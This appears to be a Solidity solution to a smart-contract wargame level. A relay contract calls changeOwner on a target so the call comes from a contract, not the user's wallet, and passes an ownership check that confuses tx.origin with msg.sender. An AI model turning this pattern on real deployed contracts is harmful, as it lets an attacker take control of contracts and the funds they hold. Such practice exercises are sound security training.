// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface targetInterface {
    function changeOwner(address _owner) external;
}

contract TelephoneRelay {
    function attack(address targetAddress) public {
        targetInterface target = targetInterface(targetAddress);
        target.changeOwner(address(this));
    }
}
